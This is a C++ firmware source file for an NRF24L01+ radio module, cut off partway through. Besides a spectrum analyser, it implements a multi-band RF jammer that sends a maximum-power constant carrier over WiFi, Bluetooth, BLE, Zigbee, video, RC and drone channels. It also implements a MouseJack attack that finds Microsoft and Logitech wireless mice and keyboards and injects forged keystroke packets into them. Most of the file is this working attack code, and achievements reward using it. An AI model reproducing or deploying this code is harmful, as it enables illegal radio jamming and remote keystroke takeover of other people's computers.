//
// NRF24L01+ module — spectrum, jammer, MouseJack
// Reference: Bruce firmware NRF24 module (nrf_spectrum, nrf_jammer, nrf_mousejack)
//

#include "NRF24Screen.h"
#include "core/AchievementManager.h"
#include "core/ScreenManager.h"
#include "core/Device.h"
#include "core/ConfigManager.h"
#include "core/PinConfigManager.h"
#include "screens/module/ModuleMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputNumberAction.h"
#include "ui/actions/InputTextAction.h"
#include "ui/views/ProgressView.h"

// ══════════════════════════════════════════════════════════════
// ═══════════════ CHANNEL LISTS (jammer) ═══════════════════
// ══════════════════════════════════════════════════════════════

static const uint8_t kChWifi[] = {
  1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23,
  26, 28, 30, 32, 34, 36, 38, 40, 42,
  51, 53, 55, 57, 59, 61, 63, 65, 67, 69, 71, 73
};
static const uint8_t kChBle[] = {
  2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28,
  30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56,
  58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80
};
static const uint8_t kChBleAdv[]    = { 2, 26, 80 };
static const uint8_t kChBt[]        = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
  17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
  31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44,
  45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58,
  59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72,
  73, 74, 75, 76, 77, 78, 79, 80
};
static const uint8_t kChUsb[]       = { 40, 50, 60 };
static const uint8_t kChVideo[]     = { 70, 75, 80 };
static const uint8_t kChRc[]        = { 1, 3, 5, 7 };
static const uint8_t kChZigbee[]    = {
  4,5,6, 9,10,11, 14,15,16, 19,20,21, 24,25,26,
  29,30,31, 34,35,36, 39,40,41, 44,45,46, 49,50,51,
  54,55,56, 59,60,61, 64,65,66, 69,70,71, 74,75,76, 79,80,81
};

static const uint8_t* const kChLists[] = {
  nullptr, kChWifi, kChBle, kChBleAdv, kChBt, kChUsb, kChVideo, kChRc, kChZigbee, nullptr
};
static const int kChCounts[] = {
  0,
  (int)sizeof(kChWifi),
  (int)sizeof(kChBle),
  (int)sizeof(kChBleAdv),
  (int)sizeof(kChBt),
  (int)sizeof(kChUsb),
  (int)sizeof(kChVideo),
  (int)sizeof(kChRc),
  (int)sizeof(kChZigbee),
  0
};

static const char* const kJamModeNames[] = {
  "Full Spectrum", "WiFi 2.4GHz", "BLE Data", "BLE Adv",
  "BT Classic", "USB Dongles", "Video/FPV", "RC Ctrl",
  "Zigbee", "Drone FHSS"
};
static const char* const kJamModeShort[] = {
  "Full Spec", "WiFi 2.4", "BLE Data", "BLE Adv",
  "BT Cls", "USB", "Video", "RC",
  "Zigbee", "Drone"
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID TABLE (MouseJack) ════════════════════
// ══════════════════════════════════════════════════════════════

// ASCII 0x20-0x7E → {modifier, keycode}
// modifier 0x02 = LSHIFT
static const NRF24Screen::HidKey kAsciiHid[] = {
  {0,0x2C},{2,0x1E},{2,0x34},{2,0x20},{2,0x21},{2,0x22},{2,0x24},{0,0x34},
  {2,0x26},{2,0x27},{2,0x25},{2,0x2E},{0,0x36},{0,0x2D},{0,0x37},{0,0x38},
  {0,0x27},{0,0x1E},{0,0x1F},{0,0x20},{0,0x21},{0,0x22},{0,0x23},{0,0x24},
  {0,0x25},{0,0x26},{2,0x33},{0,0x33},{2,0x36},{0,0x2E},{2,0x37},{2,0x38},
  {2,0x1F},
  {2,0x04},{2,0x05},{2,0x06},{2,0x07},{2,0x08},{2,0x09},{2,0x0A},{2,0x0B},
  {2,0x0C},{2,0x0D},{2,0x0E},{2,0x0F},{2,0x10},{2,0x11},{2,0x12},{2,0x13},
  {2,0x14},{2,0x15},{2,0x16},{2,0x17},{2,0x18},{2,0x19},{2,0x1A},{2,0x1B},
  {2,0x1C},{2,0x1D},
  {0,0x2F},{0,0x31},{0,0x30},{2,0x23},{2,0x2D},{0,0x35},
  {0,0x04},{0,0x05},{0,0x06},{0,0x07},{0,0x08},{0,0x09},{0,0x0A},{0,0x0B},
  {0,0x0C},{0,0x0D},{0,0x0E},{0,0x0F},{0,0x10},{0,0x11},{0,0x12},{0,0x13},
  {0,0x14},{0,0x15},{0,0x16},{0,0x17},{0,0x18},{0,0x19},{0,0x1A},{0,0x1B},
  {0,0x1C},{0,0x1D},
  {2,0x2F},{2,0x31},{2,0x30},{2,0x35}
};

// ══════════════════════════════════════════════════════════════
// ═══════════════ INIT ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onInit() {
  _cePin  = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CE,  PIN_CONFIG_NRF24_CE_DEFAULT);
  _csnPin = (int8_t)PinConfig.getInt(PIN_CONFIG_NRF24_CSN, PIN_CONFIG_NRF24_CSN_DEFAULT);

  if (_cePin < 0 || _csnPin < 0) {
    ShowStatusAction::show("Set NRF24 CE/CSN pins first");
    Screen.setScreen(new ModuleMenuScreen());
    return;
  }

  ProgressView::progress("Detecting NRF24...", 30);
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    Screen.setScreen(new ModuleMenuScreen());
    return;
  }
  _radioEnd();

  _specScanCh = 0;
  _showMenu();
}

bool NRF24Screen::inhibitPowerSave() {
  return _state != STATE_MENU && _state != STATE_JAMMER_MENU;
}
bool NRF24Screen::inhibitPowerOff() {
  return _state == STATE_JAMMER_RUNNING || _state == STATE_CH_JAMMER ||
         _state == STATE_HOPPER_RUN     || _state == STATE_SPECTRUM  ||
         _state == STATE_MJ_SCAN;
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MENU TRANSITIONS ═════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_showMenu() {
  _state = STATE_MENU;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF24L01");
  setItems(_mainItems);
}

void NRF24Screen::_showJammerMenu() {
  _state = STATE_JAMMER_MENU;
  snprintf(_titleBuf, sizeof(_titleBuf), "NRF Jammer");
  static const char* const kExtraLabels[] = {"Single CH", "CH Hopper"};
  for (int i = 0; i < kJamModes; i++) _jamMenuItems[i] = {kJamModeNames[i], nullptr};
  for (int i = 0; i < 2; i++)         _jamMenuItems[kJamModes + i] = {kExtraLabels[i], nullptr};
  setItems(_jamMenuItems, 12);
}

bool NRF24Screen::_radioBegin() {
  if (!Uni.Spi || _cePin < 0 || _csnPin < 0) return false;
  return _nrf.begin(Uni.Spi, _cePin, _csnPin);
}

void NRF24Screen::_radioEnd() {
  _nrf.end();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ ITEM SELECTION ═══════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onItemSelected(uint8_t index) {
  if (_state == STATE_MENU) {
    if (index == 0) {
      // ── Spectrum ──────────────────────────────────────────
      if (!_radioBegin()) {
        ShowStatusAction::show("NRF24 not found!");
        render();
        return;
      }
      auto* r = _nrf.radio();
      r->setAutoAck(false);
      r->disableCRC();
      r->setAddressWidth(2);
      static const uint8_t noiseAddr[][2] = {
        {0x55,0x55}, {0xAA,0xAA}, {0xA0,0xAA},
        {0xAB,0xAA}, {0xAC,0xAA}, {0xAD,0xAA}
      };
      for (uint8_t i = 0; i < 6; i++) r->openReadingPipe(i, noiseAddr[i]);
      r->setDataRate(RF24_1MBPS);
      memset(_specCh,    0, sizeof(_specCh));
      memset(_specPeak,  0, sizeof(_specPeak));
      memset(_specPeakT, 0, sizeof(_specPeakT));
      _specMode    = 0;
      _specScanCh  = 0;
      _chromeDrawn = false;
      _state       = STATE_SPECTRUM;
      snprintf(_titleBuf, sizeof(_titleBuf), "2.4G Spectrum");
      render();
      if (Achievement.inc("nrf24_spectrum") == 1) Achievement.unlock("nrf24_spectrum");

    } else if (index == 1) {
      // ── Jammer menu ───────────────────────────────────────
      _radioEnd();
      _showJammerMenu();

    } else if (index == 2) {
      // ── MouseJack ─────────────────────────────────────────
      _setupMjScan();
    }
    return;
  }

  if (_state == STATE_JAMMER_MENU) {
    if (index < kJamModes) {
      // Preset jammer mode
      _jamMode   = index;
      _jamHopIdx = 0;
      _radioBegin();
      _initCW(0);
      _lastHopMs   = millis();
      _lastRender  = millis();
      _chromeDrawn = false;
      _state = STATE_JAMMER_RUNNING;
      snprintf(_titleBuf, sizeof(_titleBuf), "Jammer");
      if (Achievement.inc("nrf24_jammer") == 1) Achievement.unlock("nrf24_jammer");
      render();

    } else if (index == kJamModes) {
      // Single CH jammer
      _radioBegin();
      _chJamCh     = 50;
      _chJamPaused = false;
      _initCW(_chJamCh);
      _chromeDrawn = false;
      _state = STATE_CH_JAMMER;
      snprintf(_titleBuf, sizeof(_titleBuf), "Single CH");
      if (Achievement.inc("nrf24_jammer") == 1) Achievement.unlock("nrf24_jammer");
      render();

    } else if (index == kJamModes + 1) {
      // CH Hopper — collect config via popups then start
      _radioEnd();
      int start = InputNumberAction::popup("Start CH (0-124)", 0, 124, 0);
      if (start < 0) start = 0;
      int stop  = InputNumberAction::popup("Stop CH (0-124)",  0, 124, 80);
      if (stop  < 0) stop  = 80;
      int step  = InputNumberAction::popup("Step (1-10)",      1, 10,  2);
      if (step  < 1) step  = 2;
      _radioBegin();
      _hopStart    = start;
      _hopStop     = stop;
      _hopStep     = step;
      _hopCh       = start;
      _initCW(_hopCh);
      _lastHopMs   = millis();
      _chromeDrawn = false;
      _state = STATE_HOPPER_RUN;
      snprintf(_titleBuf, sizeof(_titleBuf), "CH Hopper");
      if (Achievement.inc("nrf24_jammer") == 1) Achievement.unlock("nrf24_jammer");
      render();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN && _mjCount > 0) {
    // PRESS on a target — inject text
    if (index < _mjCount) {
      String text = InputTextAction::popup("Type text");
      if (text.length() > 0) _injectMjText(index, text);
      _chromeDrawn = false;
      render();
    }
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ UPDATE ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onUpdate() {
  if (_state == STATE_SPECTRUM) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        _specMode    = (_specMode + 1) % 3;
        _chromeDrawn = false;
      }
    }
    _scanSpectrum();
    if (_specScanCh == 0) {
      // Full sweep complete — render and log peak
      uint8_t maxLevel = 0; uint8_t maxCh = 0;
      for (int i = 0; i < kSpecCh; i++) {
        if (_specCh[i] > maxLevel) { maxLevel = _specCh[i]; maxCh = i; }
      }
      render();
    }
    return;
  }

  if (_state == STATE_JAMMER_RUNNING) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        auto* r = _nrf.radio();
        r->stopConstCarrier();
        r->powerDown();
        _radioEnd();
        _showJammerMenu();
        return;
      }
    }
    // Jam as fast as possible (match Bruce: tight SPI hop loop)
    uint32_t deadline = millis() + 10;
    while (millis() < deadline) _jamStep();
    if (millis() - _lastRender >= 1000) {
      _lastRender = millis();
      render();
    }
    return;
  }

  if (_state == STATE_CH_JAMMER) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _nrf.radio()->stopConstCarrier();
        _radioEnd();
        _showJammerMenu();
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        _chJamPaused = !_chJamPaused;
        if (_chJamPaused) _nrf.radio()->stopConstCarrier();
        else              _initCW(_chJamCh);
        render();
      }
      if (dir == INavigation::DIR_UP || dir == INavigation::DIR_RIGHT) {
        _chJamCh = (_chJamCh + 1) % 126;
        if (!_chJamPaused) _nrf.radio()->setChannel(_chJamCh);
        render();
      }
      if (dir == INavigation::DIR_DOWN || dir == INavigation::DIR_LEFT) {
        _chJamCh = (_chJamCh + 125) % 126;
        if (!_chJamPaused) _nrf.radio()->setChannel(_chJamCh);
        render();
      }
    }
    return;
  }

  if (_state == STATE_HOPPER_RUN) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _nrf.radio()->stopConstCarrier();
        _radioEnd();
        _showJammerMenu();
        return;
      }
    }
    // Tight hop loop — same as Bruce's CH hopper
    uint32_t deadline = millis() + 10;
    while (millis() < deadline) {
      _hopCh += _hopStep;
      if (_hopCh > _hopStop) _hopCh = _hopStart;
      _nrf.radio()->setChannel(_hopCh);
    }
    if (millis() - _lastRender >= 1000) {
      _lastRender = millis();
      render();
    }
    return;
  }

  if (_state == STATE_MJ_SCAN) {
    if (Uni.Nav->wasPressed()) {
      auto dir = Uni.Nav->readDirection();
      if (dir == INavigation::DIR_BACK) {
        _radioEnd();
        _showMenu();
        return;
      }
      if (dir == INavigation::DIR_UP) {
        if (_mjSelected > 0) { _mjSelected--; render(); }
        return;
      }
      if (dir == INavigation::DIR_DOWN) {
        if (_mjSelected < (int)_mjCount - 1) { _mjSelected++; render(); }
        return;
      }
      if (dir == INavigation::DIR_PRESS) {
        onItemSelected(_mjSelected);
        return;
      }
    }
    _stepMjScan();
    if (millis() - _lastRender > 400) {
      _lastRender = millis();
      render();
    }
    return;
  }

  ListScreen::onUpdate();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ RENDER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onRender() {
  if (_state == STATE_SPECTRUM)       { _renderSpectrum();     return; }
  if (_state == STATE_JAMMER_RUNNING) { _renderJammerStatus(); return; }
  if (_state == STATE_CH_JAMMER)      { _renderChJammer();     return; }
  if (_state == STATE_HOPPER_RUN)     { _renderHopper();       return; }
  if (_state == STATE_MJ_SCAN)        { _renderMjScan();       return; }
  ListScreen::onRender();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ BACK ═════════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::onBack() {
  switch (_state) {
    case STATE_MENU:
      _radioEnd();
      Screen.setScreen(new ModuleMenuScreen());
      break;
    case STATE_JAMMER_MENU:
      _showMenu();
      break;
    case STATE_SPECTRUM:
      _radioEnd();
      _showMenu();
      break;
    case STATE_JAMMER_RUNNING:
      _nrf.radio()->stopConstCarrier();
      _radioEnd();
      _showJammerMenu();
      break;
    case STATE_CH_JAMMER:
      _nrf.radio()->stopConstCarrier();
      _radioEnd();
      _showJammerMenu();
      break;
    case STATE_HOPPER_RUN:
      _nrf.radio()->stopConstCarrier();
      _radioEnd();
      _showJammerMenu();
      break;
    case STATE_MJ_SCAN:
      _radioEnd();
      _showMenu();
      break;
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ SPECTRUM ═════════════════════════════════════
// ══════════════════════════════════════════════════════════════

uint16_t NRF24Screen::_specBarColor(uint8_t level) {
  if (level > 85) return TFT_RED;
  if (level > 65) return 0xFD20;
  if (level > 45) return TFT_YELLOW;
  if (level > 25) return TFT_GREEN;
  return TFT_DARKGREEN;
}

void NRF24Screen::_scanSpectrum() {
  auto* r = _nrf.radio();
  if (!r) return;
  int i = _specScanCh;
  digitalWrite(_cePin, LOW);
  r->setChannel(i);
  r->startListening();
  delayMicroseconds(170);
  r->stopListening();

  if (r->testRPD()) {
    _specCh[i] = (uint8_t)min(100, (_specCh[i] + 100) / 2);
  } else {
    _specCh[i] = (uint8_t)((_specCh[i] * 3) / 4);
  }

  _specScanCh = (i + 1) % kSpecCh;

  // Update peaks once per full sweep
  if (_specScanCh == 0) {
    for (int j = 0; j < kSpecCh; j++) {
      if (_specCh[j] >= _specPeak[j]) {
        _specPeak[j]  = _specCh[j];
        _specPeakT[j] = kPeakHoldSweeps;
      } else if (_specPeakT[j] > 0) {
        _specPeakT[j]--;
      } else {
        if (_specPeak[j] > 2) _specPeak[j] -= 2;
        else _specPeak[j] = 0;
      }
    }
  }
}

void NRF24Screen::_renderSpectrum() {
  static const char* const kModeLabel[] = {"Peak", "Bars", "Dev"};
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  static constexpr int kFooterH = 11;
  int barAreaH = bh - kFooterH - 2;
  int mL = 2;
  int dW = bw - mL * 2;

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    int fy = by + bh - kFooterH + 1;
    lcd.drawString("2.400", bx + 2, fy, 1);
    lcd.drawCentreString("2.462", bx + bw / 2, fy, 1);
    lcd.drawRightString("2.525", bx + bw - 2, fy, 1);
    lcd.drawFastHLine(bx, by + barAreaH + 1, bw, TFT_DARKGREY);
    lcd.drawString(kModeLabel[_specMode], bx + 2, by + 2, 1);
    _chromeDrawn = true;
  }

  uint8_t maxLevel = 0, maxCh = 0;
  for (int i = 0; i < kSpecCh; i++) {
    int x    = bx + mL + (i * dW) / kSpecCh;
    int xN   = bx + mL + ((i + 1) * dW) / kSpecCh;
    int w    = max(1, xN - x);
    uint8_t lv = _specCh[i];
    if (lv > maxLevel) { maxLevel = lv; maxCh = i; }

    int barH  = (lv * barAreaH) / 100;
    int peakH = (_specPeak[i] * barAreaH) / 100;
    if (barH < barAreaH) lcd.fillRect(x, by, w, barAreaH - barH, TFT_BLACK);
    if (barH > 0)        lcd.fillRect(x, by + barAreaH - barH, w, barH, _specBarColor(lv));

    if (_specMode == 0 && peakH > barH && peakH > 0) {
      int py = by + barAreaH - peakH;
      if (py >= by) lcd.fillRect(x, py, w, 1, TFT_WHITE);
    }
  }
  if (maxLevel > 10) {
    char buf[10];
    snprintf(buf, sizeof(buf), "pk:%d", (int)maxCh);
    lcd.setTextColor(TFT_YELLOW, TFT_BLACK);
    lcd.fillRect(bx + bw - 46, by + 2, 44, 8, TFT_BLACK);
    lcd.drawRightString(buf, bx + bw - 2, by + 2, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ JAMMER ═══════════════════════════════════════
// ══════════════════════════════════════════════════════════════

const uint8_t* NRF24Screen::_jamChannels(int mode, int& count) {
  if (mode < 0 || mode >= kJamModes || !kChLists[mode]) {
    count = 0;
    return nullptr;
  }
  count = kChCounts[mode];
  return kChLists[mode];
}

void NRF24Screen::_initCW(int ch) {
  auto* r = _nrf.radio();
  r->powerUp();
  delay(5);
  r->setPALevel(RF24_PA_MAX);
  r->startConstCarrier(RF24_PA_MAX, ch);
  r->setAddressWidth(5);
  r->setPayloadSize(2);
  r->setDataRate(RF24_2MBPS);
}

void NRF24Screen::_jamStep() {
  int count = 0;
  const uint8_t* chList = _jamChannels(_jamMode, count);
  if (count > 0 && chList) {
    _jamHopIdx = (_jamHopIdx + 1) % count;
    _hopCh = chList[_jamHopIdx];
  } else {
    _jamHopIdx = (_jamHopIdx + 1) % 125;
    _hopCh = _jamHopIdx;
  }
  _nrf.radio()->setChannel(_hopCh);
}

void NRF24Screen::_renderJammerStatus() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  // Static chrome — drawn once
  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextDatum(TL_DATUM);
    lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    lcd.drawString(kJamModeShort[_jamMode], bx + 4, by + 4, 1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("CW  RF24_PA_MAX", bx + 4, by + 4 + bh / 5 * 2, 1);
    lcd.drawString("< Stop", bx + 4, by + bh - 12, 1);
    _chromeDrawn = true;
  }

  // Dynamic: channel — per-region sprite
  char buf[24];
  snprintf(buf, sizeof(buf), "CH:%-3d  %4dMHz", _hopCh, 2400 + _hopCh);
  Sprite sp(&lcd);
  sp.createSprite(bw - 8, 12);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_YELLOW, TFT_BLACK);
  sp.drawString(buf, 2, 0, 1);
  sp.pushSprite(bx + 4, by + 4 + bh / 5);
  sp.deleteSprite();
}

void NRF24Screen::_renderChJammer() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  int midX = bx + bw / 2, dynY = by + bh / 3;

  // Static chrome — drawn once
  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    #ifdef DEVICE_HAS_KEYBOARD
      lcd.drawString("</> CH  OK Pause  Esc Stop", bx + 4, by + bh - 12, 1);
    #else
      lcd.drawString("UP/DN:CH  OK:Pause  <:Stop", bx + 4, by + bh - 12, 1);
    #endif
    _chromeDrawn = true;
  }

  // Dynamic: channel + status — per-region sprite
  Sprite sp(&lcd);
  char buf[28];
  snprintf(buf, sizeof(buf), "CH: %d  (%d MHz)", _chJamCh, 2400 + _chJamCh);
  sp.createSprite(bw, 14);
  sp.fillSprite(TFT_BLACK);
  sp.setTextColor(TFT_YELLOW, TFT_BLACK);
  sp.drawCentreString(buf, bw / 2, 1, 1);
  sp.pushSprite(bx, dynY);
  sp.deleteSprite();

  sp.createSprite(bw, 14);
  sp.fillSprite(TFT_BLACK);
  sp.setTextColor(_chJamPaused ? TFT_RED : TFT_GREEN, TFT_BLACK);
  sp.drawCentreString(_chJamPaused ? "PAUSED" : "JAMMING", bw / 2, 1, 1);
  sp.pushSprite(bx, dynY + 16);
  sp.deleteSprite();
}

void NRF24Screen::_renderHopper() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();
  int midX = bx + bw / 2;

  // Static chrome — drawn once
  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    lcd.setTextSize(1);
    char buf[32];
    snprintf(buf, sizeof(buf), "%d - %d  step %d", _hopStart, _hopStop, _hopStep);
    lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    lcd.drawCentreString(buf, midX, by + 8, 1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawCentreString("< Stop", midX, by + bh - 12, 1);
    _chromeDrawn = true;
  }

  // Dynamic: current channel — per-region sprite
  char buf[28];
  snprintf(buf, sizeof(buf), "CH: %d  (%d MHz)", _hopCh, 2400 + _hopCh);
  Sprite sp(&lcd);
  sp.createSprite(bw, 14);
  sp.fillSprite(TFT_BLACK);
  sp.setTextColor(TFT_YELLOW, TFT_BLACK);
  sp.drawCentreString(buf, bw / 2, 1, 1);
  sp.pushSprite(bx, by + 26);
  sp.deleteSprite();
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ MOUSEJACK ════════════════════════════════════
// ══════════════════════════════════════════════════════════════

void NRF24Screen::_setupMjScan() {
  if (!_radioBegin()) {
    ShowStatusAction::show("NRF24 not found!");
    render();
    return;
  }
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(2);
  r->setDataRate(RF24_2MBPS);
  r->setPALevel(RF24_PA_MAX);
  static const uint8_t promAddr[][2] = {{0xAA,0x00},{0x55,0x00}};
  r->openReadingPipe(1, promAddr[0]);
  r->openReadingPipe(2, promAddr[1]);
  r->setPayloadSize(32);
  r->setChannel(0);
  r->startListening();

  memset(_mjTargets, 0, sizeof(_mjTargets));
  _mjCount    = 0;
  _mjSelected = 0;
  _mjScanCh   = 0;
  _mjMsSeq    = 0;
  _lastRender = millis();
  _chromeDrawn = false;
  _state = STATE_MJ_SCAN;
  snprintf(_titleBuf, sizeof(_titleBuf), "MouseJack");
  render();
  if (Achievement.inc("nrf24_mousejack") == 1) Achievement.unlock("nrf24_mousejack");
}

void NRF24Screen::_stepMjScan() {
  auto* r = _nrf.radio();
  if (!r) return;
  uint8_t buf[32];
  if (r->available()) {
    r->read(buf, 32);
    _fingerprintMj(buf, 32, (uint8_t)_mjScanCh);
  }
  if (millis() % 4 == 0) {
    r->stopListening();
    _mjScanCh = (_mjScanCh + 1) % 84;
    r->setChannel(_mjScanCh);
    r->startListening();
  }
}

void NRF24Screen::_fingerprintMj(const uint8_t* buf, uint8_t len, uint8_t ch) {
  if (len >= 19 && buf[0] == 0x08 && buf[6] == 0x40) {
    _addMjTarget(buf + 1, 5, ch, 1);
    return;
  }
  if (len >= 19 && buf[0] == 0x0A) {
    _addMjTarget(buf + 1, 5, ch, 2);
    return;
  }
  if (len >= 5 && buf[0] == 0x00) {
    if (len >= 10 && (buf[1] == 0xC2 || buf[1] == 0x4F)) {
      _addMjTarget(buf + 2, 5, ch, 3);
      return;
    }
    if (len >= 22 && buf[1] == 0xD3) {
      _addMjTarget(buf + 2, 5, ch, 3);
      return;
    }
  }
}

void NRF24Screen::_addMjTarget(const uint8_t* addr, uint8_t addrLen, uint8_t ch, uint8_t type) {
  for (uint8_t i = 0; i < _mjCount; i++) {
    if (_mjTargets[i].addrLen == addrLen && memcmp(_mjTargets[i].addr, addr, addrLen) == 0) {
      _mjTargets[i].ch = ch;
      return;
    }
  }
  if (_mjCount >= kMjMax) return;

  MjTarget& t = _mjTargets[_mjCount];
  memcpy(t.addr, addr, addrLen);
  t.addrLen = addrLen;
  t.ch   = ch;
  t.type = type;
  t.active = true;

  static const char* const kTypeNames[] = {"?", "MS", "MS+", "LOG"};
  snprintf(_mjAddrBufs[_mjCount], sizeof(_mjAddrBufs[0]),
    "%s %02X:%02X:%02X ch%d",
    kTypeNames[type & 3],
    addr[0], addr[1], addr[2], ch
  );
  if (_mjCount == 0 && Achievement.inc("nrf24_mj_found") == 1) Achievement.unlock("nrf24_mj_found");
  _mjCount++;
  _chromeDrawn = false;
  if (Uni.Speaker) Uni.Speaker->playNotification();
}

void NRF24Screen::_renderMjScan() {
  auto& lcd = Uni.Lcd;
  int bx = bodyX(), by = bodyY(), bw = bodyW(), bh = bodyH();

  if (!_chromeDrawn) {
    lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
    _chromeDrawn = true;
  }

  if (_mjCount == 0) {
    lcd.setTextSize(1);
    lcd.setTextColor(TFT_WHITE, TFT_BLACK);
    lcd.drawCentreString("Scanning...", bx + bw / 2, by + bh / 3, 1);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    char chBuf[12];
    snprintf(chBuf, sizeof(chBuf), "ch %d", _mjScanCh);
    lcd.drawCentreString(chBuf, bx + bw / 2, by + bh / 2, 1);
    return;
  }

  static constexpr int kRowH = 18;
  lcd.fillRect(bx, by, bw, bh, TFT_BLACK);
  for (int i = 0; i < (int)_mjCount && (i * kRowH) < bh; i++) {
    int rowY = by + i * kRowH;
    bool sel = (i == _mjSelected);
    uint16_t bg = sel ? Config.getThemeColor() : TFT_BLACK;
    uint16_t fg = TFT_WHITE;

    Sprite sp(&lcd);
    sp.createSprite(bw, kRowH);
    sp.fillSprite(TFT_BLACK);
    if (sel) sp.fillRoundRect(0, 2, bw, kRowH - 4, 3, bg);
    sp.setTextColor(fg, bg);
    sp.drawString(_mjAddrBufs[i], 4, kRowH / 2 - 4);
    sp.pushSprite(bx, rowY);
    sp.deleteSprite();
  }
  if (_mjCount > 0) {
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawCentreString("OK: inject text", bx + bw / 2, by + bh - 10, 1);
  }
}

// ══════════════════════════════════════════════════════════════
// ═══════════════ HID INJECTION ════════════════════════════════
// ══════════════════════════════════════════════════════════════

bool NRF24Screen::_asciiToHid(char c, HidKey& out) {
  if (c < 0x20 || c > 0x7E) return false;
  out = kAsciiHid[c - 0x20];
  return out.key != 0;
}

void NRF24Screen::_msTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(t.addrLen);
  r->setDataRate(RF24_2MBPS);
  r->openWritingPipe(t.addr);
  r->setChannel(t.ch);
  r->stopListening();

  // Microsoft HID payload (unencrypted)
  uint8_t payload[19] = {};
  payload[0] = 0x08;
  payload[5] = 0x00;   // sequence
  payload[6] = 0x40;
  payload[7] = mod;
  payload[9] = key;

  for (int i = 0; i < 5; i++) {
    r->writeFast(payload, 19, true);
    payload[9] = 0; // key up
    r->writeFast(payload, 19, true);
    delay(10);
  }
  r->flush_tx();
}

void NRF24Screen::_logTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
  auto* r = _nrf.radio();
  if (!r) return;
  r->setAutoAck(false);
  r->disableCRC();
  r->setAddressWidth(t.addrLen);
  r->setDataRate(RF24_2MBPS);
  r->openWritingPipe(t.addr);
  r->setChannel(t.ch);
  r->stopListening();

  uint8_t payload[10] = {};
  payload[0] = 0x00;
  payload[1] = 0xD3;  // Logitech HID keystroke
  payload[2] = 0x00;
  payload[3] = mod;
  payload[4] = 0x00;
  payload[5] = key;

  // Two's-complement checksum
  uint8_t ck = 0;
  for (int i = 0; i < 9; i++) ck += payload[i];
  payload[9] = (~ck + 1) & 0xFF;

  for (int i = 0; i < 5; i++) {
    r->writeFast(payload, 10, true);
    payload[5] = 0; // key up
    ck = 0;
    for (int j = 0; j < 9; j++) ck += payload[j];
    payload[9] = (~ck + 1) & 0xFF;
    r->writeFast(payload, 10, true);
    delay(10);
